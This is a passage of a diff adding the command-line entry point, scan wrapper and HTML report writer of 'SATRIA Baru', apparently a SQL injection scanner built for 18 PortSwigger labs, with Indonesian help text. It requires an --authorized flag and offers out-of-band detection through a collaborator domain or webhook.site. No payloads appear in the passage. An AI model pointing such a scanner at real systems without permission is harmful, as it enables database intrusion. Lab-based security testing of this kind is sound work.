+        "<!doctype html><html><head><meta charset='utf-8'><title>SATRIA Baru SQLi Report</title>"
+        "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
+        "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
+        ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
+        "<h1>SATRIA Baru — SQL Injection (18 Lab)</h1>"
+        f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/18</b></p>"
+        "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
+        f"<tbody>{rows}</tbody></table>"
+        "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
+        "</body></html>",
+        encoding="utf-8",
+    )
+    return json_path, html_path
+
+
+def scan_target(
+    target_url: str,
+    *,
+    authorized: bool = False,
+    allow_private: bool = False,
+    max_pages: int = 20,
+    max_points: int = 24,
+    max_requests: int = 520,
+    timeout: float = 8.0,
+    time_delay: float = 3.0,
+    oob_domain: str | None = None,
+    oob_poll_url: str | None = None,
+    oob_webhook_site: bool = False,
+) -> dict[str, Any]:
+    scanner = SatriaBaruScanner(
+        target_url,
+        authorized=authorized,
+        allow_private=allow_private,
+        max_pages=max_pages,
+        max_points=max_points,
+        max_requests=max_requests,
+        timeout=timeout,
+        time_delay=time_delay,
+        oob_domain=oob_domain,
+        oob_poll_url=oob_poll_url,
+        oob_webhook_site=oob_webhook_site,
+    )
+    return scanner.scan()
+
+
+def main(argv: list[str] | None = None) -> int:
+    parser = argparse.ArgumentParser(description="SATRIA Baru — pemindai SQL injection untuk 18 lab terpilih")
+    parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
+    parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
+    parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
+    parser.add_argument("--max-pages", type=int, default=20)
+    parser.add_argument("--max-points", type=int, default=24)
+    parser.add_argument("--max-requests", type=int, default=520)
+    parser.add_argument("--timeout", type=float, default=8.0)
+    parser.add_argument("--time-delay", type=float, default=3.0)
+    parser.add_argument("--oob-domain", default=None, help="Domain collaborator/OOB milik Anda (mis. xxxx.oastify.com).")
+    parser.add_argument("--oob-poll-url", default=None, help="Endpoint JSON untuk polling interaksi OOB.")
+    parser.add_argument("--oob-webhook-site", action="store_true", help="Buat token webhook.site otomatis untuk OOB.")
+    parser.add_argument("--output-dir", default="satria_baru_report")
+    args = parser.parse_args(argv)
+    if not args.authorized:
+        parser.error("Pengujian aktif memerlukan --authorized.")
+    try:
+        report = scan_target(
+            args.target,
+            authorized=True,
+            allow_private=args.allow_private,
+            max_pages=args.max_pages,
+            max_points=args.max_points,
+            max_requests=args.max_requests,
+            timeout=args.timeout,
+            time_delay=args.time_delay,
+            oob_domain=args.oob_domain,
+            oob_poll_url=args.oob_poll_url,
+            oob_webhook_site=args.oob_webhook_site,
+        )
+    except Exception as exc:
+        print(f"[error] {type(exc).__name__}: {exc}", file=sys.stderr)
+        return 1
+    json_path, html_path = write_report(report, Path(args.output_dir))
+    summary = report["summary"]
+    print(f"SATRIA Baru selesai: {summary['confirmed']}/18 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"JSON: {json_path}")
+    print(f"HTML: {html_path}")
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
